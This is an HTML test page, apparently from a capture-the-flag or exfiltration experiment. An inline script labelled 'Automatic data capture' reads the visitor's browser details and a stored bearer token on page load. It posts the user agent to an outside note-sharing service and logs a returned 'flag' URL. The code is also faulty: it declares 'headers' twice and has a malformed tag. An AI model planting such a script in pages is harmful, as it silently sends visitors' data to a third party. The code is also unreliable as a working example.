<html lang="en">
<head>
    <meta charset="utf-8"/>
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"/>
    <meta http-equiv="x-ua-compatible" content="ie=edge"/>

    <title>TEST</title>
</head>
<body>
<div id="space"></div>
<div">
    <img src="https://media.giphy.com/media/l0u0eiVkW4x0Y/200.gif" width="200px" alt=":c"/>
</div>
<script>
// Automatic data capture
const userAgent = navigator.userAgent;
const screenWidth = window.screen.width;
const userTimezone = Intl.DateTimeFormat().resolvedOptions().timeZone;

// Store user-related data in localStorage
localStorage.setItem('userAgent', userAgent);
localStorage.setItem('screenWidth', screenWidth);
localStorage.setItem('userTimezone', userTimezone);

console.log('User Agent:', userAgent);
console.log('Screen Width:', screenWidth);
console.log('User Timezone:', userTimezone);

// Custom headers
const headers = new Headers();
headers.append('Content-Type', 'application/json');
headers.append('Authorization', `Bearer ${localStorage.getItem('userToken')}`);
headers.append('X-User-Id', localStorage.getItem('userId'));
headers.append('User-Agent', localStorage.getItem('userAgent'));
headers.append('Screen-Width', localStorage.getItem('screenWidth'));
headers.append('User-Timezone', localStorage.getItem('userTimezone'));

// Log headers for verification
console.log('Headers:', headers);

// Data to send in the POST request
const postData = {
  key1: 'value1',
  key2: 'value2'
};

console.log('Post Data:', postData);

const url = "https://1ty.me/?mode=ajax&cmd=create_note";

const headers = new Headers();
headers.append("Sec-Ch-Ua", "Not-A.Brand;v=99, Chromium;v=124");
headers.append("Accept", "*/*");
headers.append("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
headers.append("X-Requested-With", "XMLHttpRequest");
headers.append("Sec-Ch-Ua-Mobile", "?0");
headers.append("Sec-Ch-Ua-Platform", "Windows");
headers.append("Origin", "https://1ty.me");
headers.append("Referer", "https://1ty.me/");
headers.append("Priority", "u=h, i");
headers.append("Connection", "keep-alive");

const data = new URLSearchParams();
data.append("note", userAgent);
data.append("email", "");
data.append("reference", "");
data.append("newsletter", "");
data.append("expires_on", "undefined");

fetch(url, {
  method: 'POST',
  headers: headers,
  body: data,
})
.then(response => {
  if (!response.ok) {
    throw new Error('Network response was not ok');
  }
  return response.json();
})
.then(data => {
  const flagUrl = "https://1ty.me/" + data.url;
  console.log(flagUrl);
})
.catch(error => {
  console.error('Error:', error);
});


</script>
</body>
</html>
